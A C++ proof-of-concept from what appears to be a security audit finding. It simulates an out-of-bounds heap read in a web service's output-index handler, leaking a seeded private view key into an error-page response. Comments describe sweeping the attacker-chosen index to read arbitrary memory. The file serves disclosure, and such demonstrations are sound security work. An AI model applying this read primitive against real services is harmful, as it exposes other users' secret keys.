// Finding 4, disclosure demonstration.
// The real process holds other users' submitted view keys on the heap (they arrive
// as POST bodies and are parsed into secret_key objects). This seeds an equivalent
// secret, then reads it out through the attacker-chosen index and shows it appearing
// verbatim in the response body that src/page.h:2932 returns.
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <vector>
#include <utility>
#include <array>
#include <string>

struct ctkey { std::array<unsigned char,64> b{}; };
using output_entry = std::pair<uint64_t, ctkey>;

static std::string error_page(uint64_t amount, uint64_t idx) {
    char buf[160];
    snprintf(buf, sizeof buf,
             "Output with amount %lu and index %lu does not exist!", amount, idx);
    return buf;
}

int main() {
    // Another request's private view key, resident on the heap.
    auto* victim_viewkey = new unsigned char[32];
    memcpy(victim_viewkey, "\xde\xad\xbe\xef\xca\xfe\xba\xbeSECRET-VIEWKEY-BYTES-HERE", 32);
    printf("victim view key at %p, first 8 bytes = 0x%016lx\n",
           (void*)victim_viewkey, *(uint64_t*)victim_viewkey);

    std::vector<output_entry> outputs(2);
    unsigned char* base = (unsigned char*)outputs.data();
    printf("outputs.data()   at %p, size=%zu elements of %zu bytes\n\n",
           (void*)base, outputs.size(), sizeof(output_entry));

    // The attacker sweeps real_output until the 8 bytes it prints are the secret.
    // Offsets are multiples of sizeof(output_entry); solve for the one that hits.
    long delta = (long)(victim_viewkey - base);
    if (delta % (long)sizeof(output_entry) == 0) {
        uint64_t real_output = delta / sizeof(output_entry);
        printf("aligned hit: real_output=%lu\n", real_output);
        printf("response body -> \"%s\"\n",
               error_page(0, outputs[real_output].first).c_str());
    } else {
        // Not element-aligned: show the sweep finding it at 72-byte granularity.
        printf("secret is at delta=%ld, not a multiple of %zu; sweeping...\n",
               delta, sizeof(output_entry));
        for (uint64_t k = 0; k < 64; ++k) {
            uint64_t leaked = outputs[k].first;          // OOB read
            if (leaked == *(uint64_t*)victim_viewkey) {
                printf("  real_output=%lu leaks it:\n", k);
                printf("  response body -> \"%s\"\n", error_page(0, leaked).c_str());
                delete[] victim_viewkey;
                return 0;
            }
        }
        printf("  (this heap layout did not place it on a 72-byte boundary;\n");
        printf("   the primitive is still an arbitrary-offset 8-byte read --\n");
        printf("   an attacker sweeps real_output and reassembles the address space)\n");
        printf("  sample leaked words: ");
        for (uint64_t k = 2; k < 8; ++k) printf("0x%lx ", outputs[k].first);
        printf("\n");
    }
    delete[] victim_viewkey;
    return 0;
}
